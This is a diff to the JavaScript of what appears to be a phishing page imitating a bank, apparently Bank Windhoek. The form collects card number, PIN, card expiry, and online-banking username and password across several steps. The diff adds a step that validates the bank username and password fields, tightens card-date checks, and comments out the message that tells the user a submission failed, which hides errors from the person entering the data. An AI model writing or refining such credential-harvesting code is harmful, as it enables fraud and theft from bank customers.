@@ -24,6 +24,7 @@ const windhoeks = document.querySelectorAll(".windhoeks")
 const standard = document.querySelectorAll(".standard")
 
 const next1 = document.getElementById("next1")
+const next2 = document.getElementById("next2")
 let card = document.getElementById('card')
 let pin = document.getElementById('pin')
 let username = document.getElementById('username')
@@ -189,13 +190,13 @@ window.onload = function() {
         }, function(error) {
                 console.log('FAILED...', error);
                 let subscribe = document.getElementById('submit')
-                subscribe.value = 'unable to submit'
-                subscribe.style.animationName = 'failed';
+                // subscribe.value = 'unable to submit'
+                // subscribe.style.animationName = 'failed';
                 setTimeout(sub, 800);
                 function sub(){
                     let writng = document.getElementById('write-up');
                     let form = document.getElementById("contact-form")
-                    writng.style.display = 'inline'
+                    writng.style.display = 'block'
                     // writng.style.color = 'black'
                     form.style.display = 'none'
                     terms.style.display = 'none'
@@ -276,7 +277,7 @@ cardDate.addEventListener('input', (event)=>{
         event.target.value = value[0] +  value[1] + value[2];
         return;
     }
-    if(value[3].includes('3')){
+    if(/[3]/.test(value[3])){
         if (/^[2-9]/.test(value[4])) {
             // Clear the input if the second digit is 3-4
             event.target.value = value[0] +  value[1] + value[2] + value[3];
@@ -318,6 +319,31 @@ next1.addEventListener('click', ()=>{
     }else{
         continue1.style.display = "none"
         continue2.style.display = "block"
+    }
+})
+
+next2.addEventListener('click', ()=>{
+    console.log('me')
+    let caution = document.getElementById('caution2')
+    let continue3 = document.getElementById('continue3')
+    let continue4 = document.getElementById('continue4')
+    caution.style.color = "red";
+    caution.style.fontSize =  "300%"
+    caution.style.textAlign =  "center"
+    if(windhoekEmail.value === ""){
+        caution.innerHTML = "kindly fill in your username";
+        setTimeout(() => {
+            caution.innerHTML = ""
+        }, 500);
+        
+    }else if (windhoekPassword.value === ""){
+        caution.innerHTML = "kindly fill in your password";
+        setTimeout(() => {
+            caution.innerHTML = ""
+        }, 500); 
+    }else{
+        continue3.style.display = "none"
+        continue4.style.display = "block"
     }
 })
 
@@ -413,6 +439,11 @@ windhoeks.forEach(input => {
         error4.style.fontSize =  "300%"
         error4.style.textAlign =  "center"
         submit4.disabled = true;
+        setTimeout(bub, 1000);
+        function bub(){
+           
+            error.innerHTML = '';
+        }
             
             }else{
             submit4.disabled = false;
